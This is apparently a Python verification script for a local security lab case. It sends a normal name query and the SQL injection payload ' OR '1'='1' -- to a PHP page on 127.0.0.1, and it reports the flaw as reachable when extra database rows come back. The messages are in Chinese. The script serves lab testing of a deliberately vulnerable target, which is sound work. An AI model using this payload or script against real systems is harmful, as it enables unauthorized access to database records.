import http.client
import urllib.parse
import re
import html
import sys

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"


def fetch(name):
    query = urllib.parse.urlencode({"name": name})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    conn.request(
        "GET",
        PATH + "?" + query,
        headers={"Host": f"{HOST}:{PORT}", "Accept": "text/html"},
    )
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", "replace")
    status = resp.status
    conn.close()
    return status, body


def parse_rows(body):
    pattern = re.compile(r"<p>\s*ID\s*(\d+)\s*[：:]\s*(.*?)\s*</p>", re.S)
    rows = []
    for match in pattern.finditer(body):
        row_id = match.group(1)
        row_name = html.unescape(re.sub(r"<[^>]+>", "", match.group(2))).strip()
        rows.append((row_id, row_name))
    return sorted(rows)


def main():
    expected_normal = sorted([("1", "Alice")])
    expected_test = sorted([("1", "Alice"), ("2", "Bob"), ("3", "Carol")])

    status_normal, body_normal = fetch("Alice")
    status_test, body_test = fetch("' OR '1'='1' -- ")

    normal_rows = parse_rows(body_normal)
    test_rows = parse_rows(body_test)

    print("普通请求 HTTP:", status_normal, "解析记录:", normal_rows)
    print("测试请求 HTTP:", status_test, "解析记录:", test_rows)

    if status_normal != 200:
        print("普通对照失败：HTTP 状态不是 200。")
        return 2

    if normal_rows != expected_normal:
        print("普通对照失败：未仅返回 ID 1 Alice，请检查入口、数据库连接和 lab_people 预置数据。")
        return 3

    if status_test != 200:
        print("测试请求失败：HTTP 状态不是 200。")
        return 4

    if test_rows != expected_test:
        print("测试请求未返回预期的受控业务记录，不能判定注入已触发；请检查 MariaDB 注释语法、表数据和错误输出。")
        return 5

    print("判定：测试请求返回了普通请求之外的业务记录，SQL 注入路径可达。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
